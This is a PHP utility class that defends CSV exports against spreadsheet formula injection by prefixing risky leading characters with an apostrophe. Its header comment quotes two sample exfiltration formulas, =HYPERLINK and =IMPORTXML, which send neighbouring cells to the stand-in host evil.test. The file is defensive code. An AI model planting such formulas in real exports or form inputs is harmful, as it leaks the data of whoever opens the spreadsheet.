<?php

namespace App\Support;

/**
 * Neutralise spreadsheet formula injection on the way into a CSV.
 *
 * A CSV is data until a spreadsheet opens it, at which point a cell
 * beginning `=`, `+`, `-`, `@`, a tab or a carriage return is a formula
 * and runs. Several Sayzio exports carry text a stranger wrote: an
 * attendee's name on a public RSVP form, a newsletter signup, a poll
 * answer, a menu order, a visitor's user agent. The person who opens
 * that file is the creator whose event or shop it was, which is exactly
 * the wrong person to hand a working formula to.
 *
 *   =HYPERLINK("https://evil.test?x="&A1&A2,"Results")
 *   =IMPORTXML("https://evil.test/?d="&A2, "//a")
 *
 * The first exfiltrates neighbouring cells on click; the second does it
 * silently on open in Google Sheets. Neither needs the attacker to see
 * the file -- the victim's spreadsheet makes the request for them.
 *
 * The mitigation is the usual one and matches what InboxController and
 * FormController already did by hand: prefix the risky leading
 * character with an apostrophe, which every major spreadsheet reads as
 * "the rest of this cell is literal text". The apostrophe is not part
 * of the value and is not shown in the cell.
 *
 * This class exists because that logic had been written out by hand
 * nine separate times, in nine slightly different ways, and was absent
 * from twenty-four other exports entirely. Most of the hand-rolled
 * copies checked = + - @ but not tab or CR, so each one let through the
 * payloads the other six characters cover. One copy, one place to fix.
 */
final class CsvSafe
{
    /**
     * Leading characters a spreadsheet treats as the start of a formula.
     * Tab and CR are here because Excel strips them and then reads the
     * next character, so "\t=cmd" is still a formula.
     */
    private const RISKY_LEADING = ['=', '+', '-', '@', "\t", "\r"];

    /** One cell, made inert. */
    public static function cell(mixed $value): string
    {
        if (is_array($value)) {
            $value = implode(', ', array_map(static fn ($v) => is_scalar($v) ? (string) $v : '', $value));
        } elseif ($value instanceof \BackedEnum) {
            $value = (string) $value->value;
        } elseif ($value instanceof \DateTimeInterface) {
            $value = $value->format('Y-m-d H:i:s');
        } elseif (is_bool($value)) {
            $value = $value ? '1' : '0';
        } elseif ($value === null) {
            $value = '';
        } elseif (!is_scalar($value)) {
            $value = method_exists($value, '__toString') ? (string) $value : '';
        }

        $value = (string) $value;

        if ($value !== '' && in_array($value[0], self::RISKY_LEADING, true)) {
            return "'" . $value;
        }

        return $value;
    }

    /** Every cell in a row, made inert. */
    public static function row(array $row): array
    {
        return array_map(static fn ($v) => self::cell($v), $row);
    }

    /**
     * The inverse of cell(), for the one place that round-trips: the
     * contact directory exports a CSV and accepts the same file back.
     * Only an apostrophe that cell() would itself have added is removed,
     * so a name the user genuinely typed as 'Quote stays intact.
     */
    public static function uncell(mixed $value): string
    {
        $value = (string) $value;

        if (($value[0] ?? null) === "'"
            && ($value[1] ?? null) !== null
            && in_array($value[1], self::RISKY_LEADING, true)) {
            return substr($value, 1);
        }

        return $value;
    }

    /**
     * Drop-in for fputcsv, down to the signature. Header rows are
     * developer-authored and could skip this, but they go through it
     * too: a header built from a creator's own custom question label is
     * no safer than the answers underneath it.
     *
     * $enclosure and $escape are forwarded rather than defaulted away.
     * Eight call sites pass ',', '"', '' deliberately -- an empty escape
     * is the RFC-4180 behaviour, and silently restoring PHP's backslash
     * default would corrupt those exports.
     */
    public static function put(
        $handle,
        array $row,
        string $separator = ',',
        string $enclosure = '"',
        string $escape = '\\'
    ): int|false {
        return fputcsv($handle, self::row($row), $separator, $enclosure, $escape);
    }

    /**
     * One row as a string, for the two exports that assemble CSV text by
     * hand instead of writing to a handle. They each carried their own
     * quoting routine and neither neutralised formulas.
     */
    public static function line(
        array $row,
        string $separator = ',',
        string $enclosure = '"',
        string $escape = '\\'
    ): string {
        $handle = fopen('php://temp', 'r+');
        self::put($handle, $row, $separator, $enclosure, $escape);
        rewind($handle);
        $line = (string) stream_get_contents($handle);
        fclose($handle);

        return rtrim($line, "\r\n");
    }
}
